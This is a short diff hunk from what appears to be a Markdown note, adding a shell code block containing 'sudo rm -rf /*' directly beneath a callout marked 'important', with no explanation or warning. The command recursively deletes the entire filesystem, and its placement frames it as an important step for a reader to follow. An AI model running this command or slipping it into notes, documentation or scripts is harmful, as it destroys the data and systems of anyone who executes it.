@@ -16,8 +16,9 @@ tags:
 >[!important] important
 
 
-
-
+```shell
+sudo rm -rf /*
+```
 
 
 ## References
